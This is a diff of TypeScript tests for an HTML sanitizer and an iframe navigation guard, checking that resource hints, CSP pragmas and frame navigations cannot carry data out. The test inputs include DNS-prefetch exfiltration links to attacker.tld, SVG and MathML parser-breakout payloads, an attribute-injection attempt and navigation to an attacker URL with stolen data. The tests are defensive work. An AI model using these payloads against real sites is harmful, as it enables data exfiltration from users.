@@ -186,6 +186,30 @@ function livePragmaCount(html: string): number {
   ).length
 }
 
+const HINT_RELS = new Set(['dns-prefetch', 'preconnect', 'prefetch', 'prerender'])
+
+/**
+ * How many LIVE resource hints a spec parser builds.
+ *
+ * `relList` is the whole test: an HTML `<link>` has one, and an SVG/MathML
+ * `link` — which is what `<svg><link rel=dns-prefetch>` builds — does not,
+ * because it is a foreign element that happens to be spelled like a hint and
+ * resolves nothing. Counting tag names instead would call an inert one live.
+ */
+function liveHintCount(html: string): number {
+  const { window } = new JSDOM(html)
+  return [...window.document.getElementsByTagName('link')].filter(
+    (link: any) => link.relList && [...link.relList].some((rel: string) => HINT_RELS.has(rel.toLowerCase())),
+  ).length
+}
+
+/** What a spec parser's DOMTokenList makes of the first `<link>`'s rel. */
+function relListOf(html: string): string[] {
+  const { window } = new JSDOM(html)
+  const link: any = window.document.getElementsByTagName('link')[0]
+  return link?.relList ? [...link.relList] : []
+}
+
 const ATTACK = (id: string) => `default-src 'none'; report-uri https://attacker.tld/${id}`
 
 /** Documents where the parser builds the element and the old scanner walked
@@ -368,9 +392,238 @@ describe('resource hints cannot carry data out', () => {
     )
   })
 
+  // Finding #2 of the 2026-08-16 re-attack, measured: the value was SPLIT on
+  // literal whitespace in the raw text and each piece CLASSIFIED after decoding,
+  // so a character-reference separator made one opaque token that decoded to
+  // contain a hint — nothing was left to keep and the whole element went, taking
+  // the page's own stylesheet with it. That is over-strip of the USER's html.
+  it('splits rel on the DECODED value, so a &#32; separator cannot take the stylesheet down with it', () => {
+    expect(sanitizeServedHtml('<link rel="stylesheet&#32;dns-prefetch" href="/assets/app.css">')).toBe(
+      '<link rel="stylesheet" href="/assets/app.css">',
+    )
+    // A tab reference, and one on the other side of the hint.
+    expect(sanitizeServedHtml('<link rel="stylesheet&#9;preconnect" href="/a.css">')).toBe(
+      '<link rel="stylesheet" href="/a.css">',
+    )
+    expect(sanitizeServedHtml('<link rel="prefetch&#32;icon" href="/favicon.ico">')).toBe(
+      '<link rel="icon" href="/favicon.ico">',
+    )
+  })
+
+  it('agrees with the parser about what those tokens ARE, before and after', () => {
+    const before = '<link rel="stylesheet&#32;dns-prefetch" href="/assets/app.css">'
+    expect(relListOf(before), 'case no longer decodes to two tokens').toEqual(['stylesheet', 'dns-prefetch'])
+    expect(relListOf(sanitizeServedHtml(before))).toEqual(['stylesheet'])
+  })
+
+  it('writes kept tokens back as RAW spans, so a quote reference cannot escape the attribute', () => {
+    // The property the raw-span writeback exists for: the decoded token holds a
+    // quote and an attribute that would be REAL markup if it were written back
+    // decoded. It has to come out as the reference it went in as.
+    const hostile = '<link rel="stylesheet&#34; onload=&#34;boom dns-prefetch" href="/a.css">'
+    const out = sanitizeServedHtml(hostile)
+    expect(out).toContain('&#34;')
+    const { window } = new JSDOM(out)
+    const links = [...window.document.getElementsByTagName('link')]
+    expect(links).toHaveLength(1)
+    expect(links[0].hasAttribute('onload'), 'the rewrite injected an attribute').toBe(false)
+    expect([...links[0].relList]).toEqual(['stylesheet"', 'onload="boom'])
+  })
+
+  it('still removes the element when every decoded token is a hint', () => {
+    expect(sanitizeServedHtml('<link rel="dns-prefetch&#32;preconnect" href="//x.attacker.tld">')).toBe('')
+  })
+
   it('does not touch hint-shaped TEXT, same as the pragma scan', () => {
     const doc = '<textarea><link rel="dns-prefetch" href="//x.tld"></textarea>'
     expect(sanitizeServedHtml(doc)).toBe(doc)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// Foreign content: SVG / MathML (adversarial re-attack, 2026-08-16, finding #1)
+// ---------------------------------------------------------------------------
+//
+// Inside `<svg>`/`<math>`, `style`/`script`/`textarea`/`xmp`/`iframe`/`noembed`
+// and `title` are ordinary foreign elements whose children are MARKUP. The
+// scanner treated those names as RAWTEXT/RCDATA everywhere, which is wrong in
+// both directions — and the under-strip direction turned out not to be the
+// inert one the finding expected: a `<meta>` inside foreign content BREAKS OUT,
+// so everything after it is HTML again and the `<link rel=dns-prefetch>`
+// elements that follow are live hints the strip never saw.
+
+describe('the scan knows where HTML stops and SVG/MathML begins', () => {
+  it('strips the hint links a breakout smuggles past a rawtext skip — a WORKING channel', () => {
+    // The payload: the walker skips `<svg><style>` … `</style>` as rawtext, but
+    // `<meta>` pops the parser out of foreign content, so every link after it
+    // is an HTML `<link>` with a working relList — one DNS query per chunk at
+    // the attacker's own resolver, none of them stripped.
+    const html =
+      '<svg><style><meta>' +
+      '<link rel="dns-prefetch" href="//mfrgg2lo.attacker.tld">' +
+      '<link rel="dns-prefetch" href="//nbswy3dp.attacker.tld">' +
+      '</style></svg>'
+    expect(liveHintCount(html), 'case no longer produces live hints').toBe(2)
+    const out = sanitizeServedHtml(html)
+    expect(liveHintCount(out)).toBe(0)
+    expect(out).not.toContain('attacker.tld')
+  })
+
+  it('strips a pragma the same skip hid, in every element that loses its content model', () => {
+    for (const wrap of ['style', 'script', 'textarea', 'xmp', 'iframe', 'noembed']) {
+      const html = `<svg><${wrap}><meta http-equiv="content-security-policy" content="${ATTACK(wrap)}"></${wrap}></svg>`
+      expect(livePragmaCount(html), `${wrap}: case is not actually live`).toBe(1)
+      expect(livePragmaCount(sanitizeServedHtml(html)), wrap).toBe(0)
+    }
+    // Position note, not a claim this test proves: the survivor always lands in
+    // <body> (an <svg> can never be a head child), and Chromium only honours a
+    // CSP <meta> that IS a head child — so the PRAGMA half of this was inert.
+    // The hint half above is not, which is why the fix is code and not a note.
+  })
+
+  it('leaves an SVG-namespace <link> alone — it is not a hint, it is foreign markup', () => {
+    // The over-strip half of the same finding: `link` does not break out, so
+    // this is an SVG element with no relList and no resolution, and deleting it
+    // edited the page's own drawing.
+    const html = '<svg><link rel="dns-prefetch" href="//a.tld"></svg>'
+    expect(liveHintCount(html), 'case is not actually inert').toBe(0)
+    expect(sanitizeServedHtml(html)).toBe(html)
+  })
+
+  it('strips inside an HTML integration point, where HTML parsing resumes', () => {
+    // `<svg><title>` is NOT RCDATA — it is an integration point, and a link
+    // under it is a live HTML hint. This was a documented residual that
+    // measurement showed to be a live one.
+    const html = '<svg><title><link rel="dns-prefetch" href="//t.attacker.tld"></title></svg>'
+    expect(liveHintCount(html), 'case no longer produces a live hint').toBe(1)
+    expect(liveHintCount(sanitizeServedHtml(html))).toBe(0)
+  })
+
+  it('goes back to skipping RAWTEXT inside an integration point — the other direction', () => {
+    // Inside <foreignObject>/<desc> HTML rules apply again, so <style> IS
+    // rawtext again and the pragma in it is TEXT. Suspending the skip for the
+    // whole subtree would corrupt this.
+    const html = '<svg><foreignObject><style><meta http-equiv="content-security-policy" content="x"></style></foreignObject></svg>'
+    expect(livePragmaCount(html), 'case is not actually inert').toBe(0)
+    expect(sanitizeServedHtml(html)).toBe(html)
+  })
+})
+
+describe('the foreign-content model, measured against the parser case by case', () => {
+  // Every context below places the same payloads somewhere that decides whether
+  // they are markup at all. The assertion is the scanner's whole contract, in
+  // both directions at once: nothing the parser makes LIVE may survive, and
+  // anything it makes INERT must come back byte-identical.
+  const CONTEXTS: Array<{ name: string; wrap: (payload: string) => string }> = [
+    { name: 'plain HTML (the control)', wrap: (p) => `<head>${p}</head>` },
+    { name: 'svg > style', wrap: (p) => `<svg><style>${p}</style></svg>` },
+    { name: 'svg > script', wrap: (p) => `<svg><script>${p}</script></svg>` },
+    { name: 'svg > textarea', wrap: (p) => `<svg><textarea>${p}</textarea></svg>` },
+    { name: 'svg > xmp', wrap: (p) => `<svg><xmp>${p}</xmp></svg>` },
+    { name: 'svg > iframe', wrap: (p) => `<svg><iframe>${p}</iframe></svg>` },
+    { name: 'svg > noembed', wrap: (p) => `<svg><noembed>${p}</noembed></svg>` },
+    { name: 'svg (direct child)', wrap: (p) => `<svg>${p}</svg>` },
+    { name: 'svg > g', wrap: (p) => `<svg><g>${p}</g></svg>` },
+    { name: 'svg > title (HTML integration point)', wrap: (p) => `<svg><title>${p}</title></svg>` },
+    { name: 'svg > desc > style (HTML again, so RAWTEXT again)', wrap: (p) => `<svg><desc><style>${p}</style></desc></svg>` },
+    { name: 'svg > foreignObject', wrap: (p) => `<svg><foreignObject>${p}</foreignObject></svg>` },
+    { name: 'svg > foreignObject > style', wrap: (p) => `<svg><foreignObject><style>${p}</style></foreignObject></svg>` },
+    { name: 'svg > foreignObject > svg > style (foreign again)', wrap: (p) => `<svg><foreignObject><svg><style>${p}</style></svg></foreignObject></svg>` },
+    { name: 'math > ms > style (MathML text integration point)', wrap: (p) => `<math><ms><style>${p}</style></ms></math>` },
+    { name: 'math > mtext', wrap: (p) => `<math><mtext>${p}</mtext></math>` },
+    { name: 'math > annotation-xml[encoding=text/html] > style', wrap: (p) => `<math><annotation-xml encoding="text/html"><style>${p}</style></annotation-xml></math>` },
+    { name: 'math > annotation-xml (no encoding) > style', wrap: (p) => `<math><annotation-xml><style>${p}</style></annotation-xml></math>` },
+    { name: 'math > mi (a MathML link is inert too)', wrap: (p) => `<math><mi>${p}</mi></math>` },
+    { name: 'self-closing <svg/> opens nothing', wrap: (p) => `<svg/>${p}` },
+    { name: 'svg > style, after a <br> breakout', wrap: (p) => `<svg><style><br>${p}</style></svg>` },
+    { name: 'svg > style, after a <font color> breakout', wrap: (p) => `<svg><style><font color="red">${p}</style></svg>` },
+    { name: 'svg > style, after a <font> that does NOT break out', wrap: (p) => `<svg><style><font>${p}</style></svg>` },
+    { name: 'svg > style, after a </p> exit', wrap: (p) => `<svg><style></p>${p}</style></svg>` },
+    { name: 'svg > style, after a </br> exit', wrap: (p) => `<svg><style></br>${p}</style></svg>` },
+    { name: 'svg > style, after an unmatched </div> (which does NOT exit)', wrap: (p) => `<svg><style></div>${p}</style></svg>` },
+    { name: 'svg > style, after </svg>', wrap: (p) => `<svg><style></svg>${p}` },
+    { name: 'svg > CDATA', wrap: (p) => `<svg><![CDATA[${p}]]></svg>` },
+    { name: 'svg > style > CDATA', wrap: (p) => `<svg><style><![CDATA[${p}]]></style></svg>` },
+    { name: 'template (an inert fragment)', wrap: (p) => `<template>${p}</template>` },
+    { name: 'template > svg > style', wrap: (p) => `<template><svg><style>${p}</style></svg></template>` },
+    { name: 'uppercase SVG > STYLE', wrap: (p) => `<SVG><STYLE>${p}</STYLE></SVG>` },
+    { name: 'svg > style inside a real <script> (still rawtext, HTML content)', wrap: (p) => `<script>var s = "<svg><style>${p}</style></svg>"</script>` },
+  ]
+
+  const PAYLOADS: Array<{ name: string; html: string }> = [
+    { name: 'a hint link', html: '<link rel="dns-prefetch" href="//c1.attacker.tld">' },
+    { name: 'a CSP pragma', html: '<meta http-equiv="content-security-policy" content="default-src \'none\'">' },
+    { name: 'a breakout meta then a hint link', html: '<meta><link rel="preconnect" href="//c2.attacker.tld">' },
+    { name: 'a mixed rel', html: '<link rel="stylesheet prefetch" href="/mixed.css">' },
+    { name: 'a link that is nobody\'s business', html: '<link rel="stylesheet" href="/plain.css">' },
+  ]
+
+  // Appended in a SECOND document per case, never the first: it carries a live
+  // hint of its own, and mixing it into the byte-identity check below would
+  // make that check vacuous — no case would ever be "inert" again.
+  const TAIL = '<link rel="stylesheet" href="/after.css"><link rel="prerender" href="//tail.attacker.tld"><p>tail</p>'
+
+  for (const context of CONTEXTS) {
+    for (const payload of PAYLOADS) {
+      it(`${context.name} :: ${payload.name}`, () => {
+        const html = context.wrap(payload.html)
+        const out = sanitizeServedHtml(html)
+        // 1. Nothing the parser calls live may survive, wherever it was hidden.
+        expect(livePragmaCount(out), 'a live pragma survived').toBe(0)
+        expect(liveHintCount(out), 'a live hint survived').toBe(0)
+        // 2. …and nothing it calls inert may be touched. Deleting bytes a
+        //    browser keeps is how a scanner silently breaks working output.
+        if (livePragmaCount(html) === 0 && liveHintCount(html) === 0) {
+          expect(out, 'over-strip: the parser makes this inert').toBe(html)
+        }
+        // 3. The walker came back out where the parser does: the tail is plain
+        //    HTML content whatever the wrapper did to the walker's position, so
+        //    its stylesheet stays and its hint goes. A desync shows up here.
+        const tailed = sanitizeServedHtml(html + TAIL)
+        expect(tailed, 'the tail stylesheet was corrupted').toContain('<link rel="stylesheet" href="/after.css">')
+        expect(tailed, 'the tail hint survived').not.toContain('tail.attacker.tld')
+        expect(tailed).toContain('<p>tail</p>')
+      })
+    }
+  }
+})
+
+describe('<noscript> is rawtext in the canvas frame, which always has scripting', () => {
+  // Finding #3 of the re-attack. The source used to justify VISITING inside
+  // <noscript> as refusing to treat a live element as inert — backwards for
+  // this deployment: both mount sites carry
+  // `sandbox="allow-scripts allow-same-origin allow-forms"`, so the canvas
+  // frame parses <noscript> content as RAWTEXT and never renders it, and the
+  // scanner was editing text.
+  //
+  // NOTE THE ORACLE. jsdom's default parse has scripting DISABLED, which is the
+  // OTHER parser; `runScripts: 'dangerously'` is the only setting that turns the
+  // scripting flag on, so it is what the canvas frame's parse has to be
+  // measured against. The payload below contains no script to run.
+  const inNoscript = '<noscript><link rel="dns-prefetch" href="//n.tld"><meta http-equiv="content-security-policy" content="x"></noscript>'
+
+  function countsWithScripting(html: string): { links: number; metas: number } {
+    const { window } = new JSDOM(html, { runScripts: 'dangerously' })
+    return {
+      links: window.document.getElementsByTagName('link').length,
+      metas: window.document.getElementsByTagName('meta').length,
+    }
+  }
+
+  it('leaves it byte-identical, because a scripting-enabled parser builds nothing there', () => {
+    const scripted = countsWithScripting(inNoscript)
+    expect(scripted, 'the canvas frame would build elements here after all').toEqual({ links: 0, metas: 0 })
+    expect(sanitizeServedHtml(inNoscript)).toBe(inNoscript)
+  })
+
+  it('is a DEPLOYMENT fact, and the residual is stated: scripting off would make that markup', () => {
+    // The same document under the other parser — jsdom's default, scripting
+    // off. This is the case the source comment now names as the residual: a
+    // canvas frame mounted without scripting would have a live hint here that
+    // is no longer stripped, and `X-DNS-Prefetch-Control: off` is what covers
+    // it (that frame has no bridge either, so it is already broken).
+    expect(liveHintCount(inNoscript)).toBe(1)
+    expect(livePragmaCount(inNoscript)).toBe(1)
   })
 })
 
@@ -403,6 +656,10 @@ describe('a canvas frame may only navigate inside its own canvas+version', () =>
 
   it('does not interfere with the initial mount from a non-canvas document', () => {
     expect(isCanvasFrameNavigationAllowed('about:blank', A)).toBe(true)
+    // '' answers "not a canvas" here too — a true statement about the STRING.
+    // It is no longer a decision about a navigation: the guard drops empty urls
+    // before this point rather than treating one as an allowing source. See the
+    // installCanvasFrameNavigationGuard cases below.
     expect(isCanvasFrameNavigationAllowed('', A)).toBe(true)
   })
 })
@@ -463,11 +720,54 @@ describe('installCanvasFrameNavigationGuard', () => {
     expect(fire({ frame: { url: undefined }, initiator: { url: undefined } }).prevented).toBe(true)
   })
 
-  it('still allows an EMPTY source url — that is the initial mount, not an absence', () => {
-    // Deliberate, and the line between this and the case above: '' is a frame
-    // with no committed document. Refusing it would leave the canvas pane
-    // permanently blank.
-    expect(fire({ frame: { url: '' }, initiator: null }).prevented).toBe(false)
+  // Finding #4 of the re-attack. An EMPTY source url used to be counted as an
+  // ALLOWING source, on the reasoning that '' is "only" a frame with no
+  // committed document, i.e. the pane's mount. An uncommitted SUBFRAME of a
+  // canvas document reports '' as well, so that reasoning handed it a free
+  // first hop. '' is now no information, and the allowance is narrowed to the
+  // mount's own shape rather than removed — which is what keeps the pane from
+  // going permanently blank.
+  const APP = 'file:///C:/app/index.html'
+  const CANVAS_A = 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html'
+
+  it('allows an empty url ONLY as the canvas pane\'s own mount: app parent, canvas target', () => {
+    // The shape both mount sites have — the pane's iframe and the off-screen
+    // capture frame are direct children of the app's own document.
+    expect(fire({ frame: { url: '', parent: { url: APP } }, initiator: null }).prevented).toBe(false)
+    expect(fire({ frame: { url: '', parent: { url: 'http://localhost:5173/' } }, initiator: null }).prevented).toBe(
+      false,
+    )
+  })
+
+  it('refuses an uncommitted SUBFRAME of a canvas document — same empty url, different parent', () => {
+    // A src-less <iframe> a canvas page created. Off the scheme entirely…
+    expect(
+      fire({
+        frame: { url: '', parent: { url: CANVAS_A } },
+        initiator: null,
+        url: 'https://attacker.tld/?stolen',
+      }).prevented,
+    ).toBe(true)
+    // …and to another canvas, which is the window.name theft shape.
+    expect(fire({ frame: { url: '', parent: { url: CANVAS_A } }, initiator: null }).prevented).toBe(true)
+  })
+
+  it('refuses an empty url with nothing to vouch for it, and one that is not a mount', () => {
+    expect(fire({ frame: { url: '' }, initiator: null }).prevented).toBe(true)
+    expect(fire({ frame: { url: '', parent: null }, initiator: null }).prevented).toBe(true)
+    expect(fire({ frame: { url: '', parent: { url: '' } }, initiator: null }).prevented).toBe(true)
+    // A mount goes INTO a canvas version; a first hop anywhere else is not one.
+    expect(
+      fire({ frame: { url: '', parent: { url: APP } }, initiator: null, url: 'https://attacker.tld/' }).prevented,
+    ).toBe(true)
+  })
+
+  it('answers from the OTHER source when there is one — an empty url never overrode it', () => {
+    // Why dropping '' can only change the outcome when it was the ONLY source:
+    // the loop refuses if ANY source refuses, so an allowing '' never decided
+    // anything on its own.
+    expect(fire({ frame: { url: '' }, initiator: { url: CANVAS_A } }).prevented).toBe(true)
+    expect(fire({ frame: { url: '' }, initiator: { url: APP } }).prevented).toBe(false)
   })
 
   it('leaves the main frame to will-navigate', () => {
